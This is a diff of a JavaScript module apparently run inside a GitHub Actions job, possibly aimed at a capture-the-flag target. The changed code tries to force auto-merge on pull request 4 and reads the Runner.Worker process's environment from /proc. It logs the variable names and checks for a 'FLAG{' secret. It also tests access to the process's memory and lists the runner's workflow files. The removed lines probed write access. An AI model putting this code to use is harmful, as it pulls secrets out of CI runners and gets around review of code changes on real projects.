@@ -1,87 +1,87 @@
 import fs from 'node:fs';
 
-const MARK = 'EXT_AUTO';
+const MARK = 'EXT_P4';
 
 export default async function ({ github, context, core, output }) {
   const ts = Date.now();
-  const id = `auto-${context.runId}-${ts}`;
+  const id = `p4-${context.runId}-${ts}`;
   const log = (...a) => console.log(MARK, id, ...a);
   const R = context.repo;
-  const PR = 4;
 
   const probe = async (name, fn) => {
     try {
       const r = await fn();
       const data = r?.data ?? r;
-      log('PROBE', name, 'OK', r?.status ?? '', JSON.stringify(data ?? {}).slice(0, 400));
+      log('PROBE', name, 'OK', r?.status ?? '', JSON.stringify(data ?? {}).slice(0, 300));
       return { ok: true, data };
     } catch (e) {
-      log('PROBE', name, 'FAIL', e.status ?? '', String(e.message).slice(0, 400));
+      log('PROBE', name, 'FAIL', e.status ?? '', String(e.message).slice(0, 800));
       return { ok: false, status: e.status };
     }
   };
 
-  const pr = await probe('graphql.pullRequest', async () => {
+  // minimal graphql
+  const pr = await probe('graphql.pullRequest.min', async () => {
     const r = await github.graphql(
-      `query($owner:String!,$repo:String!,$n:Int!){repository(owner:$owner,name:$repo){pullRequest(number:$n){id number mergeable mergeStateStatus isCrossRepository repository{autoMergeAllowed} viewerPermission}}}`,
-      { owner: R.owner, repo: R.repo, n: PR },
+      `query($owner:String!,$repo:String!,$n:Int!){repository(owner:$owner,name:$repo){pullRequest(number:$n){id number mergeable mergeStateStatus}}}`,
+      { owner: R.owner, repo: R.repo, n: 4 },
     );
     return r.repository.pullRequest;
   });
-
-  if (pr.ok && pr.data?.id) {
+  if (pr.ok) {
     await probe('graphql.enablePullRequestAutoMerge', () =>
       github.graphql(
-        `mutation($prId:ID!,$mm:PullRequestMergeMethod!){enablePullRequestAutoMerge(input:{pullRequestId:$prId,mergeMethod:$mm}){clientMutationId pullRequest{number autoMergeRequest{enabledAt mergeMethod}}}}`,
+        `mutation($prId:ID!,$mm:PullRequestMergeMethod!){enablePullRequestAutoMerge(input:{pullRequestId:$prId,mergeMethod:$mm}){clientMutationId}}`,
         { prId: pr.data.id, mm: 'MERGE' },
       ),
     );
   }
 
-  // alternate content-write surfaces, in case one scope is evaluated differently
-  await probe('git.createBlob', () =>
-    github.rest.git.createBlob({ owner: R.owner, repo: R.repo, content: 'probe', encoding: 'utf-8' }),
-  );
-  await probe('git.createTree', () =>
-    github.rest.git.createTree({ owner: R.owner, repo: R.repo, tree: [] }),
-  );
-  await probe('repos.createRelease', () =>
-    github.rest.repos.createRelease({ owner: R.owner, repo: R.repo, tag_name: `probe-${ts}` }),
-  );
-  await probe('repos.createDispatch', () =>
-    github.rest.repos.createDispatchEvent({
-      owner: R.owner,
-      repo: R.repo,
-      event_type: 'probe',
-    }),
-  );
-
-  // inspect local runner processes for secret material (read-only)
+  // local environment reconnaissance
+  try {
+    log('PTRACE_SCOPE', fs.readFileSync('/proc/sys/kernel/yama/ptrace_scope', 'utf8').trim());
+  } catch (e) {
+    log('PTRACE_SCOPE_ERR', String(e.message));
+  }
   try {
     const pids = fs.readdirSync('/proc').filter((p) => /^\d+$/.test(p));
-    const found = [];
     for (const pid of pids) {
       try {
-        const cmd = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ').slice(0, 120);
-        if (/Runner\.Worker|Runner\.Listener/i.test(cmd)) {
-          let envLen = -1;
-          let probeOk = false;
-          try {
-            envLen = fs.readFileSync(`/proc/${pid}/environ`).length;
-            probeOk = true;
-          } catch (e) {
-            probeOk = false;
-          }
-          found.push({ pid, cmd, environ_readable: probeOk, environ_len: envLen });
+        const cmd = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ');
+        if (!/Runner\.Worker/i.test(cmd)) continue;
+        const env = fs.readFileSync(`/proc/${pid}/environ`, 'utf8');
+        const keys = env.split('\0').map((x) => x.split('=')[0]).filter(Boolean);
+        log('WORKER_ENV_KEYS', JSON.stringify({ pid, keys }));
+        log('WORKER_ENV_HAS_FLAG', env.includes('FLAG{'));
+        let memOk = false;
+        let memErr = '';
+        try {
+          const fd = fs.openSync(`/proc/${pid}/mem`, 'r');
+          fs.closeSync(fd);
+          memOk = true;
+        } catch (e) {
+          memErr = String(e.code || e.message);
         }
+        log('WORKER_MEM_OPEN', JSON.stringify({ pid, memOk, memErr }));
+        const fds = fs.readdirSync(`/proc/${pid}/fd`).length;
+        log('WORKER_FD_COUNT', fds);
       } catch (e) {
         /* ignore */
       }
     }
-    log('RUNNER_PROCS', JSON.stringify(found));
-    log('WORKSPACE_TMP', JSON.stringify(fs.readdirSync('/home/runner/work/_temp').slice(0, 20)));
   } catch (e) {
-    log('PROC_SCAN_ERR', String(e.message));
+    log('PROC_ERR', String(e.message));
+  }
+
+  try {
+    const dir = '/home/runner/work/_temp/_github_workflow';
+    log('WORKFLOW_DIR', JSON.stringify(fs.readdirSync(dir).map((n) => {
+      const p = `${dir}/${n}`;
+      const st = fs.statSync(p);
+      return { n, size: st.size };
+    })));
+  } catch (e) {
+    log('WORKFLOW_DIR_ERR', String(e.message));
   }
 
   log('DONE');
